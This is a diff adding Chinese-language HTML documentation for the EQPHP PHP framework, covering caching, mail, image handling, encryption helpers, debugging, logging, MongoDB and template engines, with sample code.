+$memcache->replace('memcache','EQPHP is a PHP framework!',0,300);<br><br>
+
+<i>//删除：$memcache->delete('键名','删除周期')</i><br>
+$memcache->delete('memcache',10); <i>//10s内(0,立即)删除memcache</i><br><br>
+
+
+<i>//获取：$memcache->get('键名')</i><br>
+echo $memcache->get('version'); <i>//输出：1.0</i>
+</code><br>
+2、memcache集群,用法除了获取memcache实例之外和简单应用相同<br>
+<code>
+<i>//获取一个memcache实例：</i><br>
+$memcache=memory::cluster(); <br><br>
+
+<i>//用法</i><br>
+$memcache->set('version','3.0',0,0);<br>
+$memcache->replace('memcache','EQPHP is a PHP framework!',0,300);<br>
+$memcache->delete('memcache'); <i>//删除redis</i><br>
+$memcache->get('version'); <i>//输出：3.0</i>
+</code><br>
+
+3、redis主从，打开config/local/redis.php文件：<br>
+<code>
+    
+
+return [<br>
+    <b class="i24"></b>'redis'=>['host'=>'localhost','port'=>6379,],<br>
+    <b class="i24"></b>'redis1'=>['host'=>'192.168.0.103','port'=>6379,],<br>
+    <b class="i24"></b>'redis2'=>['host'=>'192.168.0.111','port'=>6379,],<br>
+    ];<br>
+</code><br>
+用法如下<br>
+<code>
+<i>//获取redis主、从对象：</i><br>
+$master=memory::group(true); <br>
+$slave=memory::group(false); <br><br>
+
+<i>//用法</i><br>
+$master->set('version','3.0',0,0);<br>
+$master->replace('redis','EQPHP is a PHP framework!',0,300);<br>
+$master->delete('redis',10); <i>//10s内(0,立即)删除memcache</i><br>
+$slave->get('version'); <i>//输出：3.0</i>
+</code><br>
+
+
+
+
+二、硬盘缓存（文件缓存），分为时间触发缓存、内容触发缓存、永久缓存（静态化）<br>
+
+<code>
+<i>//实例化一个cache对象：new cache('文件名','目录','缓存周期')，周期为0则缓存3年</i><br>
+$cache=new cache('8.php','user_info',60);<br><br>
+
+<i>//缓存数据：$cache->save($data)</i><br>
+$data=[<br>
+　'id'=>8,<br>
+　'title'=>'EQPHP V1.0版本上线发布',<br>
+　'info'=>'EQPHP V1.0版本上线发布，敬请下载使用。',<br>
+　'pub_time'=>'2013-10-18 15:11::10'<br>
+];<br>
+$cache->save($data);　<i>//cache/db/php/user_info/目录下生成缓存文件（确保目录可写）</i><br><br>
+
+<i>//获取数据：$cache->get()</i><br>
+$user_info=$cache->get();<br>
+out($user_info); <i>//60s内会输出上边的$data结果，超过输出null</i><br><br>
+
+<i>//删除数据：$cache->clear('[是否删除目录]')</i><br>
+$cache->clear(); <i>//删除生成的php文件</i><br>
+$cache->clear(true); <i>//连同user_info目录一起删除</i>
+</code><br>
+<span class="fcy1">Tip：</span> 根据文件扩展名(txt/php/ini/js/xml)可以缓存成纯文本数据、php数组、配置文件、json数据、xml数据；<br>
+　　　如果将数据缓存为txt文件，获取时加参数true，即：$data=$cache->get(true)；<br>
+　　　如果缓存为ini文件，必须是带有键名的二维数组，加键名获取某一项，不加获取所有，即：$data=$cache->get('键名')。<br><br>
+
+
+<strong>静态化(static)</strong><br>
+将长期无变化的数据直接生成静态网页也是很有必要的，或者保存为json数据直接供前端使用也是一种不错的优化方式。<br>
+<code>
+<i>//生成静态网页html文件</i><br>
+$url=help::url('news.detail',5);<br>
+$html=file_get_contents($url);<br>
+file::write(FILE_HTML.'news/5.html',$html);<br><br>
+
+<i>//生成json数据文件</i><br>
+$data=[<br>
+　'id'=>8,<br>
+　'title'=>'EQPHP V1.0版本上线发布',<br>
+　'info'=>'EQPHP V1.0版本上线发布，敬请下载使用。'<br>
+];<br>
+file::write(FILE_JSON.'news/8.js',$data);
+</code><br>
+<span class="fcy1">Tip：</span>上述生成html方法不能用于有session(或cookie)验证的页面。
+</div>
+
+<div class="item">
+<strong>邮件(mail)</strong><br>
+1、配置邮件参数,打开config/local/mail.php<br>
+<code>
+    
+return [<br>
+<b class="i24"></b>'host'=>'smtp.163.com',<br>
+<b class="i24"></b>'port'=>25,<br>
+<b class="i24"></b>'user'=>'eqphp',<br>
+<b class="i24"></b>'password'=>'******',<br>
+<b class="i24"></b>'from'=>[<br>
+<b class="i48"></b>'address'=>'eqphp@163.com',<br>
+<b class="i48"></b>'name'=>'EQPHP开源框架',<br>
+<b class="i24"></b>],<br>
+];<br>
+
+</code><br>
+
+2、发送邮件：<span class="fsb">with('mail')->take(['主题','内容'])->send('收件邮箱')</span><br>
+<code>
+<i>//单发：</i><br>
+with('mail')->take(['EQPHP问候','您好，EQPHP向你问好'])->send('123456789@qq.com');<br><br>
+
+<i>//群发：用英文分号隔开邮箱</i><br>
+with('mail')->take(['EQPHP问候','您好，EQPHP向你问好'])->send('123789@qq.com', 'abcde@tom.com;good@126.com');
+</code><br>
+
+3、使用邮件模板：<span class="fsb">with('mail')->take($data, '模板名称')->send('收件邮箱')</span><br>
+<code>
+<i>//用法如下：</i><br>
+$data=[<br>
+<b class="i24"></b>'site_name'=>'EQPHP开源社区',<br>
+<b class="i24"></b>'register_url'=>help::url('register.activate').'/',<br>
+<b class="i24"></b>'email_code'=>md5($user_email.time()),<br>
+];<br>
+with('mail')->take($data, 'register_activation')->send('example@126.com');
+</code><br>
+
+模板内容：view/template/register_activation.html<br>
+<code>
+&lt;title&gt;{site_name}email认证激活&lt;/title&gt;<br>
+&lt;body&gt;&lt;br&gt;邮箱为{user_email}的朋友：&lt;br&gt;&lt;br&gt;<br>
+欢迎加入{site_name}!&lt;br&gt;&lt;br&gt;<br>
+请点击下面的链接完成注册：&lt;br&gt;&lt;br&gt;<br>
+&lt;a href="{register_url}{email_code}" target="_blank"&gt;{register_url}{email_code}&lt;/a&gt;&lt;br&gt;&lt;br&gt;<br>
+如果以上链接无法点击，请将上面的地址复制到你的浏览器(如IE)的地址栏进入{site_name}。&lt;br&gt;&lt;br&gt;&lt;br&gt;<br>
+--{site_name}&lt;br&gt;&lt;br&gt;(这是一封自动产生的email，请勿回复。)&lt;br&gt;&lt;br&gt;&lt;/body&gt;<br>
+</code><br>
+
+<strong>图像(image)</strong><br>
+图像的基本操作（创建、打开、样式风格、绘制、填充、文本、旋转、复制合并、滤镜、输出、清理等）请参照工具类img<br>
+以下几种常用技术：生成验证码、添加水印、指定尺寸缩放（缩略图）、生成用户图像<br>
+
+1、生成验证码<span class="fsb">picture::code('验证字符','宿,'髿,'字体大小')</span><br>
+<code>
+$check_code=basic::code(4);<br>
+picture::code($check_code); <i>//效果如下图：</i><br>
+</code><br><img src="image/example_check_code.gif" alt="captcha"><br><br>
+
+2、为图片添加水印<span class="fsb">picture::mark('图片名称','水印字符','保存参数')</span><br>
+<code>
+$picture=FILE_TEMP.'example.jpg';<br>
+$mark_info=['http://www.eqphp.com','艺青科技'];<br>
+$save_param=['eqphp_create_mar.jpg',FILE_TEMP];<br>
+picture::mark($picture,$mark_info,$save_param); <i>//水印效果如下图：</i><br>
+</code><br><img src="image/pic_create_mark.gif" alt="photo water mark"><br><br>
+
+3、按照指定尺寸缩放图片：<span class="fsb">picture::zoom('图片名称','保存参数','尺寸','是否为高')</span><br>
+<code>
+<i>//将533px*800px的example.jpg等比例缩放为宽240px的pic_example_zoom.jpg</i>
+$picture=FILE_TEMP.'example.jpg';<br>
+$save_param=['pic_example_zoom.jpg',FILE_TEMP];<br>
+picture::zoom($picture,$save_param,240);
+</code><br>
+
+4、生成指定尺寸的用户头像：<span class="fsb">picture::avatar('图片名称','尺寸数据,'存放目录')</span><br>
+<code>
+$picture=FILE_TEMP.'example_avatar.png';<br>
+$size_data=[100,75,50,32];<br>
+picture::avatar($picture,$size_data,FILE_TEMP);<i>//效果如下图：</i><br>
+</code><br>
+<img src="image/example_avatar_100.gif" alt="100px avatar sample">&nbsp;
+<img src="image/example_avatar_75.gif" alt="750px avatar sample">&nbsp;
+<img src="image/example_avatar_50.gif" alt="50px avatar sample">&nbsp;
+<img src="image/example_avatar_32.gif" alt="32px avatar sample">&nbsp;<br><br>
+
+<strong>加密-解密(encrypt-decrypt)</strong><br>
+开发中，有些敏感数据需要保护起来，比如银行卡号、个人隐私等。<br>
+1、加密：<span class="fsb">secure::encrypt('待加密数据','密钥')</span><br>
+<code>
+echo secure::encrypt('我的银行卡号是：61247858756434478','753951'); <br>
+<i>//输出：YNXpV0Y0gTpvjeDna5O+uig2JkGhLmvOQXkIZbYcL1rX/1ele7WKITYzjfXsaaFNQrjwAqQfvGuY9mOnrqoB7w==</i>
+</code><br>
+
+2、解密：<span class="fsb">secure::decrypt('待解密数据','密钥')</span><br>
+<code>
+$text='YNXpV0Y0gTpvjeDna5O+uig2JkGhLmvOQXkIZbYcL1rX/1ele7WKITYzjfXsaa<br>FNQrjwAqQfvGuY9mOnrqoB7w==';<br>
+echo secure::decrypt($text,'753951'); <i>//输出：我的银行卡号是：61247858756434478</i>
+</code><br>
+
+<span class="fcy1">Tip：</span>加密/解密甚耗资源，加密后数据体积2-5倍增加（越小倍数越大），请酌情使用。<br><br>
+</div>
+
+
+
+<div class="item">
+<strong>性能、错误调试(debug)</strong><br>
+1、打印变量：<span class="fsb">debug::out('打印句柄','输出模式','是否终止脚本')</span><br>
+<code>
+$num=12.48;<br>
+$user_info=['id'=>10,'account'=>'admin','level'=>9];<br>
+$cache=with('cache','out.txt',date('Y-m'),1200);<br><br>
+
+debug::out($num); <i>//输出（第二个参数默认为0-var_dump）：float(12.48)</i><br>
+debug::out($user_info,1); <i>//输出（参数1-print_r）：<br>
+[<br>
+　[id] => 10<br>
+　[account] => admin<br>
+　[level] => 9<br>
+]
+</i><br>
+
+debug::out($user_info,2); <i>//输出（参数2-var_export）：<br>
+[<br>
+　'id' => 10,<br>
+　'account' => 'admin',<br>
+　'level' => 9,<br>
+]
+</i><br>
+
+debug::out($cache,0,true); <i>//输出（参数true表示脚本继续执行）：<br>
+object(cache)#1 (5) {<br>
+　["custom_dir":"cache":private]=><br>
+　string(12) "txt/2013-10/"<br>
+　["save_dir":"cache":private]=><br>
+　string(39) "/var/www/eqphp/cache/db/txt/2013-10/"<br>
+　["file_name":"cache":private]=><br>
+　string(75) "/var/www/eqphp/cache/db/txt/2013-10/84a74c5f187659bbb84494c039873807.txt"<br>
+　["ext":"cache":private]=><br>
+　string(3) "txt"<br>
+　["valid":"cache":private]=><br>
+　int(1200)<br>
+}
+</i><br>
+</code><br>
+
+2、运行追溯：<span class="fsb">debug::trace('追溯信息','文件名')</span><br>
+<code>
+debug::trace('充值开始','prepay.log'); <br>
+...<br>
+$trace_data=['user_id'=>$user_id,'amount'=>$amount,'method'=>'alipay'];<br>
+debug::trace($trace_data,'prepay.log'); <br>
+...<br>
+debug::trace('事务执行结果:'.$result,'prepay.log'); <br>
+debug::trace('充值结束','prepay.log');
+</code>
+prepay.log文件内容如下：<br>
+<code>
+充值开始<br>
+[<br>
+　　[user_id] => 8<br>
+　　[amount] => 100<br>
+　　[method] => alipay<br>
+]<br><br>
+事务执行结果:1<br>
+充值结束
+</code><br>
+
+3、查看系统信息：<span class="fsb">debug::info('类型参数')</span><br>
+类型参数：['basic','const','variable','function','class','interface','file']<br>
+<code>
+out(debug::info(0),1); <i>//输出（环境基本参数）：<br>
+[<br>
+　[system] => Windows NT ACER-PC 6.1 build 7601 ((null) Service Pack 1) i586<br>
+　[service] => apache2handler<br>
+　[php_version] => 5.3.0<br>
+　[frame_name] => eqphp<br>
+　[frame_version] => 1.0<br>
+　[magic_quotes] => 0<br>
+　[time_zone] => PRC<br>
+]
+</i><br>
+
+out(debug::info(1),1); <i>//输出（自定义常量）：<br>
+[<br>
+　[PATH_ROOT] => /var/www/eqphp/<br>
+　[U_R_L] => http://www.eqphp.com/eqphp/<br>
+　[URL_URI] => http://www.eqphp.com/eqphp/son/<br>
+　[URL_REQUEST] => eqphp/son<br>
+　[SITE_DOMAIN] => www.eqphp.com<br>
+　[PATH_CONFIG] => /var/www/eqphp/config/<br>
+　……<br>
+]
+</i><br>
+
+out(debug::info('file'),1); <i>//输出（引用加载文件）：<br>
+[<br>
+　[0] => /var/www/eqphp/index.php<br>
+　[1] => /var/www/eqphp/server/function_lib.php<br>
+　[2] => /var/www/eqphp/server/system.php<br>
+　[3] => /var/www/eqphp/action/a_son.php<br>
+　[4] => /var/www/eqphp/action/a_pop.php<br>
+　[5] => /var/www/eqphp/library/debug.php<br>
+]
+</i><br>
+</code><br>
+
+4、查看内耗-内存使用、耗时：<span class="fsb">debug::flag()、debug::used('起点','终点')</span>
+<code>
+debug::flag($begin); <i>//起点</i><br>
+http::string('Hello world !',true,false);<br>
+…… code …… <i>//待测试代码</i><br>
+debug::flag($end); <i>//终点</i><br>
+$result=debug::used($begin,$end); <i>//计算内耗</i><br>
+out($result,1); <i>//输出（耗时、内存、内存峰值）：<br>
+[<br>
+　[0] => 0.002s<br>
+　[1] => 334.438kb<br>
+　[2] => 4325.875kb<br>
+]
+</i><br>
+</code><br>
+
+5、使用xhprof插件：<span class="fsb">xhprof_enable()、xhprof_disable()、debug::xhprof('结果数据','生成报告名')</span>
+<code>
+xhprof_enable(); <i>//开启</i><br>
+http::string('Hello world !',true,false);<br>
+…… code …… <i>//待测试代码</i><br>
+$data=xhprof_disable(); <i>//获取数据包</i><br>
+echo debug::xhprof($data,'xhprof_test'); <i>//显示xhprof测试结果 :</i>
+</code><br>
+<img src="image/xhprof_href.gif" alt="xhprof result"><br>点击XHPROF_RESULT，<br><br>
+<img src="image/xhprof_result.gif" alt="xhprof result focus"><br><br>点击[View Full CallGraph]，<br>
+<img src="image/xhprof_result_pic.gif" alt="xhprof result"><br><br>
+
+
+<strong>日志(log)</strong><br>
+实际开发运营中，我们需要了解系统的运行状态、性能，以便我们及时作出处理决策，使系统继续保持良好的运行势态，这时记录日志和分析日志就显得相当重要。<br>
+EQPHP根据使用经验将日志分为异常日志（错误、警告等）和轨迹日志（SQL、访问记录等）。可使用写文件方法file::write()，也可在log类里自行定义封装。<br>
+
+一、系统运行日志<br>
+1、日志参数配置：logger.php<br>
+<code>
+<i>//日志级别</i><br>
+'level'=>['debug','info','notice','warning','error','crit','alert','emerg'],<br><br>
+
+<i>//保存模式：单一(single)、一起(all)</i><br>
+'store_mode'=>'single',<br><br>
+
+<i>//是否分组保存</i><br>
+'is_module_save'=>true,<br><br>
+
+<i>//均不保存(0),全部保存(1),指定level中的部分值</i><br>
+'store_level'=>1,<br><br>
+
+<i>//报警模式：不报警(null)、发邮件(email)、发手机短信(message)、发邮件并发短信(both)</i><br>
+'alarm_mode'=>'email',<br>
+'title'=>'EQPHP system alarm',<br>
+'email'=>'2581221391@qq.com',<br>
+'phone'=>'1866677****',<br>
+</code>
+
+2、使用方法如下：
+<code>
+logger::info('this is a info log');<br>
+logger::error('user API call fail');<br>
+logger::error('news model not found');<br>
+logger::alert('bad, system paralysis');<br>
+</code>
+
+3、log/run目录下的生成日志文件如下：<br>
+<code>
+alert_2014_12_10.log<br>
+error_2014_12_10.log<br>
+info_2014_12_10.log<br><br>
+
+<i>//error_2014_12_10.log的内容：</i><br>
+[16:42:06] error: user API call fail<br>
+[16:42:06] error: news model not found<br>
+</code><br><br>
+
+
+二、专项、主题日志记录<br>
+1、异常、错误记录方法：<span class="fsb">logger::exception('异常分类(日志名)','记录内容')</span>
+<code>
+logger::exception('mysql',mysql_error()); <i>//记录SQL语句执行错误</i><br><br>
+
+<i>//自定义异常、错误方法：</i><br>
+logger::memcache($host,$port); <i>//memcache异常、错误</i>
+</code><br>
+
+2、自定义日志记录方法
+<code>
+<i>//记录SQL语句：logger::mysql($sql,$is_read)</i><br>
+logger::mysql("insert into test (name,info) values ('test','test ok')",false);<br><br>
+
+<i>//也可直接使用file::write('日志名','内容','记录模式')</i><br>
+$file=LOG_TEST.'test.sql';<br>
+$data=date('Y-m-d H:i:s').'log test';<br>
+file::write($file,$data,'a+');
+</code>
+</div>
+
+<div class="item">
+	
+	<p>至于什么是NoSQL？目前流行的NoSQL数据库有哪些？各自都有什么特点？适合哪些使用场景？…… 暂且不聊。</p>
+	<p>至于Key-Value类型的memcache、redis应用参见缓存章节，这里就只说说文档类型的mongoDB用法吧。</p><br>
+	
+	<p>
+	<strong>一、mongoDB链接：打开配置文件config/local/mongo.php，配置如下</strong><br>
+	<code>
+	
+
+<b class="i24"></b>return [<br>
+<b class="i48"></b>//mongodb://[username:password@]hostname[:port][/database]<br>
+<b class="i48"></b>'server'=>'mongodb://eqphp:123456@127.0.0.1:27017/eqphp',<br>
+<b class="i24"></b>];
+	</code></p><br>
+	
+	<p><strong>二、mongoDB的查询</strong><br>
+	<code>
+	
+	<i>//1、获取一个集合(collection)</i><br>
+	$this->user = with('mg','user');<br><br>
+	
+	
+	<i>//2、获取文档的一个节点(相当于mysql的一个字段)</i><br>
+	$this->user->node('profile.email',['id'=>8]);<i>//framework@eqphp.com</i><br><br>
+	
+	<i>//3、获取一个文档(相当于mysql一条记录)</i><br>
+	$this->user->document('uuid,wallet,login_history',['id'=>8]);<br>
+	<i>//返回结果为：<br>
+	
+	[<br>
+		<b class="i24"></b>'uuid'=>'52c19972-5338-5338-5338-0ee62aa5b5b4',<br>
+		<b class="i24"></b>'wallet'=>[<br>
+			<b class="i48"></b>'money'=>180.99,<br>
+			<b class="i48"></b>'point'=>876,<br>
+		<b class="i24"></b>],<br>
+		<b class="i24"></b>'login_history'=>[<br>
+			<b class="i48"></b>['ip'=>'114.12.132.22','time'=>'2014-10-21 13:12:00'],<br>
+			<b class="i48"></b>['ip'=>'114.12.132.22','time'=>'2014-10-23 15:21:10'],<br>
+			<b class="i48"></b>['ip'=>'114.12.132.22','time'=>'2014-11-17 20:18:13'],<br>
+		<b class="i24"></b>],<br>
+	]
+	</i>
+	<br><br>
+	
+	<i>//4、获取一批文档(相当于mysql多条记录)</i><br>
+	$condition=['sex'=>'male','age'=>['$gt',23]];<br>
+	list($field,$sort,$limit)=['uuid,login_history',['age'=>'asc'],3];<br>
+	$this->user->document($field,$condition,$sort,$limit);<br>
+	<i>//返回结果为：<br>
+	[<br>
+	<b class="i24"></b>[<br>
+		<b class="i48"></b>'uuid'=>'52c19972-5338-5338-5338-0ee62aa5d85c4',<br>
+		<b class="i48"></b>'login_history'=>[<br>
+			<b class="i72"></b>['ip'=>'114.12.132.22','time'=>'2014-10-21 13:12:00'],<br>
+			<b class="i72"></b>['ip'=>'114.12.132.22','time'=>'2014-10-23 15:21:10'],<br>
+			<b class="i72"></b>['ip'=>'114.12.132.22','time'=>'2014-11-17 20:18:13'],<br>
+		<b class="i48"></b>],<br>
+	<b class="i24"></b>],<br><br>
+	<b class="i24"></b>[<br>
+		<b class="i48"></b>'uuid'=>'52c19972-5338-5338-5338-0ee62aa5b5b4',<br>
+		<b class="i48"></b>'login_history'=>[<br>
+			<b class="i72"></b>['ip'=>'114.12.132.22','time'=>'2014-10-21 13:12:00'],<br>
+		<b class="i48"></b>],<br>
+	<b class="i24"></b>],<br><br>
+	<b class="i24"></b>[<br>
+		<b class="i48"></b>'uuid'=>'26c19972-5338-5338-5338-0ee62aa5b5b5',<br>
+		<b class="i48"></b>'login_history'=>[<br>
+			<b class="i72"></b>['ip'=>'114.12.132.22','time'=>'2014-10-21 13:12:00'],<br>
+			<b class="i72"></b>['ip'=>'114.12.132.22','time'=>'2014-10-23 15:21:10'],<br>
+			<b class="i72"></b>['ip'=>'114.12.132.22','time'=>'2014-11-17 20:18:13'],<br>
+		<b class="i48"></b>],<br>
+	<b class="i24"></b>],<br><br>
+	]<br><br>
+	</i>
+	
+	<i>//5、分页查询文档(相当于mysql分页查询)</i><br>
+	$this->user->page($field,$condition,$sort,$page,$page_size);<br><br>
+
+    <i>//6、文档总数查询</i><br>
+    $this->user->count($condition);<br><br>
+
+    <i>//6、文档聚合统计查询</i><br>
+    $this->user->tally($condition,$option);<br>
+
+    </code><br>
+	</p>
+
+    <p><strong>二、mongoDB的更新</strong><br>
+        <code>
+            <i>//1、创建文档:collection::post($data,$method,$option)</i><br>
+            $data['profile']=['name'=>'Art','age'=>26,'sex'=>'female'];<br>
+            $data['wallet']=['money'=>118.89,'point'=>1121];<br>
+            $this->collection->post($data,'insert');<i>//method取值有：batchInsert,insert,save</i><br><br>
+
+            <i>//2、修改文档:collection::patch($data,$condition,$is_all=true,$is_insert=false)</i><br>
+            $data['wallet']=['money'=>125.88,'point'=>111];<br>
+            $collection['uuid']='52c19972-5338-5338-5338-0ee62aa5b5b4';<br>
+            $collection['version']='1489876064321';<br>
+            $this->collection->patch($data,$collection);<br><br>
+
+            <i>//3、删除文档:collection::delete($condition,$is_one=false)</i><br>
+            $collection['uuid']='52c19972-5338-5338-5338-0ee62aa5b5b4';<br>
+            $collection['version']='1489876064321';<br>
+            $this->collection->delete($collection);<br>
+        </code>
+    </p><br>
+
+    <p><strong>三、直接使用内置原生mongoDB操作方法</strong><br>
+        <code>
+            <i>//1、获取collection对象:with('mg','user')->collection</i><br>
+            with('mg','user')->collection->drop();<br><br>
+
+            <i>//2、获取database对象:with('mg')->database</i><br>
+            with('mg')->database->listDBs();<br>
+
+        </code><br>
+
+        <span class="fcy1">Tip：使用内置原生mongoDB操作方法不会记录操作语句日志。</span><br><br>
+    </p>
+	
+	</div>
+    <div class="item">
+
+        <strong>一、迷你模板引擎(view)</strong><br>
+        在API应用大爆发的时代，页面数据渲染大多交给前端脚本去处理，如采用artTemplate.<br>
+        php模板使用已变得无足轻重，这里就简单介绍一下具有正则匹配性质的view迷你模板引擎。<br><br>
+
+        1、定界符、模板/编译文件存放目录设置，直接修改view类(library/view.php)成员属性<br>
+        <code>
+            
+
+            class view{<br><br>
+
+            <b class="i24"></b>public $_tpl_vars=[];<br>
+            <b class="i24"></b><i>//定界符</i><br>
+            <b class="i24"></b>public $tpl_left_delimiter='{';<br>
+            <b class="i24"></b>public $tpl_right_delimiter='}';<br>
+            <b class="i24"></b>public $tpl_template_dir='';<br>
+            <b class="i24"></b>public $tpl_compile_dir='';<br>
+            <b class="i24"></b>public $tpl_safe_mode=false;<br>
+            <b class="i24"></b>public $tpl_check=true;<br><br>
+
+            <b class="i24"></b>function __construct(){<br>
+            <b class="i48"></b><i>//模板/编译文件存放目录</i><br>
+                <b class="i48"></b>$this->tpl_template_dir=PATH_VIEW;<br>
+                <b class="i48"></b>$this->tpl_compile_dir=PATH_CACHE.'compile/';<br>
+                <b class="i24"></b>}<br>
+        </code><br><br>
+
+
+        2、控制器(action/a_index.php)代码 - 指定模板文件并为其变量“赋值”<br>
+        <code>
+            
+
+            class a_index{<br><br>
+
+            <b class="i24"></b><i>//静态类(yes)</i><br>
+            <b class="i24"></b>private $static_class;<br><br>
+
+            <b class="i24"></b>function index(){<br>
+
+            <b class="i48"></b>$data['manager']=['name'=>'jack','blog'=>U_R_L];<br>
+            <b class="i48"></b>$data['user_list']=[<br>
+            <b class="i72"></b>['id'=>8,'sex'='male','name'=>'Art','age'=>'26','time'=>'2014-10-15'],<br>
+            <b class="i72"></b>['id'=>11,'sex'='female','name'=>'小火柴','age'=>'15','time'=>'2013-10-15'],<br>
+            <b class="i72"></b>['id'=>37,'sex'='male','name'=>'Bob大叔','age'=>'43','time'=>'2001-08-21'],<br>
+            <b class="i48"></b>];<br>
+            <b class="i48"></b>with('view')->assign($data)->display('index.html');<br>
+            <b class="i24"></b>}<br>
+            }<br>
+        </code><br><br>
+
+        3、模板(view/index.php)代码 - 文件块加载、变量/函数调用、条件判断、循环<br>
+        <code>
+            {include "common/header.html"}<br><br>
+
+            &lt;!--管理员信息--&gt;<br>
+            管理员：&lt;a href="{$manager.blog}" title="访问博客"&gt;{$manager.name}&lt;/a&gt;<br><br>
+
+            &lt;!--用户信息--&gt;<br>
+            &lt;ul&gt;<br>
+            <b class="i24"></b>{foreach ($user_list as $key=>$user)}<br>
+            <b class="i48"></b>&lt;li&gt;&lt;a href="{echo URL.'user/'}{$user.id}">{$user.name}&lt;/a&gt;,<br>
+            <b class="i48"></b>{if $user.sex === 'male'}男{elseif $user.sex === 'female'}女{/if}，<br>
+            <b class="i48"></b>年龄：{echo abs($user.age - 3)}，注册时间：{$user.time}&lt;/li&gt;<br>
+            <b class="i24"></b>{/foreach}<br>
+            &lt;/ul&gt;<br><br>
+
+            {include "common/footer.html"}<br>
+        </code><br><br>
+
+        3、更多用法请参博文：<a href="">EQPHP迷你模板引擎(view)语法手册</a><br><br><br><br>
+
+        <strong>二、第三方模板引擎(smarty)</strong><br>
+        公共组件/块加载(function)、变量调节器(modifier)、模板继承(block)三大特性让smarty在众多的模板引擎大放光芒，语法简洁、性能出众，<br>
+        使得smarty比twig更胜一筹，接下来看看在EQPHP中如何简单快速的使用smarty.<br><br>
+
+        1、初始化smarty使用环境<br>
+        <p>去github下载经过整合的smarty数据包：<a href="https://github.com/eqphp/smarty" target="_blank">https://github.com/eqphp/smarty</a>，将下载的压缩包解压并改名为smarty后放入data目录下。</p>
+        <p>确保框架里smarty扩展集成类库文件(library/smarty3.php)存在，library/shortcut.php文件中有smarty调用入口方法：</p>
+        <code>
+            
+            <b class="i24"></b><i>//模板配置</i><br>
+            <b class="i24"></b>function smarty($module='home'){<br>
+            <b class="i48"></b>return smarty3::tpl($module);<br>
+            <b class="i24"></b>}<br>
+        </code>
+        <p>配置环境变量config/local/smarty.php</p>
+        <code>
+            
+
+            return [<br>
+            <b class="i24"></b>'home'=>[<br>
+            <b class="i48"></b>'error'=>true,<br>
+            <b class="i48"></b>'debug'=>false,<br>
+            <b class="i48"></b>'allow_php'=>false,<br><br>
+
+            <b class="i48"></b><i>//定界符</i><br>
+            <b class="i48"></b>'left'=>'{',<br>
+            <b class="i48"></b>'right'=>'}',<br><br>
+
+            <b class="i48"></b><i>//模板、编译、常量存放目录</i><br>
+            <b class="i48"></b>'template'=>'view/',<br>
+            <b class="i48"></b>'compile'=>'cache/smarty/compile/',<br>
+            <b class="i48"></b>'const'=>'cache/smarty/const/',<br><br>
+
+            <b class="i48"></b><i>//缓存</i><br>
+            <b class="i48"></b>'caching'=>false,<br>
+            <b class="i48"></b>'expire'=>68400,<br>
+            <b class="i48"></b>'path'=>'cache/smarty/data/',<br>
+            <b class="i24"></b>),<br>
+
+            );<br>
+        </code><br><br>
+
+        2、基本应用：模板指定、变量“赋值”、文件块加载、变量/常量调用、条件判断、循环<br>
+        <p>控制器代码如下：</p>
+        <code>
+            
+
+            class a_index{<br><br>
+
+            <b class="i24"></b><i>//静态类(yes)</i><br>
+            <b class="i24"></b>private $static_class;<br><br>
+
+            <b class="i24"></b>function index(){<br>
+
+            <b class="i48"></b>$data['manager']=['name'=>'jack','blog'=>U_R_L];<br>
+            <b class="i48"></b>$data['user']=[<br>
+            <b class="i72"></b>['id'=>8,'sex'='male','name'=>'Art','age'=>'26','time'=>'2014-10-15'],<br>
+            <b class="i72"></b>['id'=>11,'sex'='female','name'=>'小火柴','age'=>'15','time'=>'2013-10-15'],<br>
+            <b class="i72"></b>['id'=>37,'sex'='male','name'=>'Bob大叔','age'=>'43','time'=>'2001-08-21'],<br>
+            <b class="i48"></b>];<br>
+            <b class="i48"></b>smarty()->assign($data)->display('index.html');<br>
+            <b class="i24"></b>}<br>
+            }<br>
+        </code>
+        <p>视图(模板)代码如下：</p>
+        <code>
+            {config_load file="admin_topic.conf"}<br>
+            {include file="common/header.html"}<br><br>
+
+            <i>&lt;!--管理员信息--&gt;</i><br>
+            管理员：&lt;a href="{$manager.blog}" title="访问博客"&gt;{$manager.name}&lt;/a&gt;<br><br>
+
+            <i>&lt;!--用户信息--&gt;</i><br>
+            &lt;ul class="{#user_list_style#}"&gt;<br>
+            <b class="i24"></b>{section key $user}<br>
+            <b class="i48"></b>&lt;li&gt;&lt;a href="{$url.'user/'}{$user[key].id}">{$user[key].name}&lt;/a&gt;,<br>
+            <b class="i48"></b>{if $user[key].sex eq 'male'}男{elseif $user[key].sex === 'female'}女{/if}，<br>
+            <b class="i48"></b>年龄：{echo abs($user[key].age - 3)}，注册时间：{$user[key].time|date_format}&lt;/li&gt;<br>
+            <b class="i24"></b>{/section}<br>
+            &lt;/ul&gt;<br><br>
+
+            {include file="common/footer.html"}<br>
+        </code><br><br>
+
+        3、自定义组件(function)：<br>
+        <p>开发中我们经常遇到重复处理的页面功能块，如网页头部信息、导航栏、最新资讯（多个模块那种）。接下来看看全局组件：网页头部信息组件的开发与调用。</p>
+        <p>编写plugin/p_function.php文件中的head方法，编写view/plugin/head.html文件即可完成组件的开发。模板调用如下：</p>
+        <code>
+            {head script="jquery|common" style="basic|center"}
+        </code><br><br>
+
+        4、自定义变量调节器(modifier)：<br>
+        <p>见名知意，变量调节器就是对模板中的变量进行修饰处理的，如用*掩盖用户的敏感数据，只需在plugin/p_modifier.php文件中编写静态方法：</p>
+        <code>
+            <i>//掩藏用户敏感信息</i><br>
+            static function mask($string,$type='phone'){<br>
+            <b class="i24"></b>if (empty($string)) return '';<br>
+            <b class="i24"></b>switch($type) {<br>
+            <b class="i24"></b>case 'phone':<br>
+            <b class="i48"></b>return substr_replace($string,'****',3,4);<br>
+            <b class="i24"></b>case 'alipay_account':<br>
+            <b class="i48"></b>return substr($string,0,3).'***'.substr($string,-4);<br>
+            <b class="i24"></b>default:<br>
+            <b class="i48"></b>return $string;<br>
+            <b class="i24"></b>}<br>
+            }<br>
+        </code>
+        <p>模板调用如下：</p>
+        <code>
+            {$phone_number|mask:'phone'}
+        </code><br><br>
+
+        5、模板继承(block)：
+        <p>观察我们开发的网页，头目、banner、菜单栏、尾部内容大多不变，只有中间主体在变化。<br>
+            按照传统的方式，每个页面我们都include一大堆文件，是不是很重复，不方便修改维护。模板继承正好可以帮我们解决这个问题。</p>
+
+        <p>编写母版视图：view/user/layer/center.html<p>
+        <code>
+            {head script="jquery|common|center" style="basic|plugin/popup|center"}<br>
+            {center_header_banner user_id=$user_id}<br><br>
+
+            &lt;div class="stage"&gt;<br>
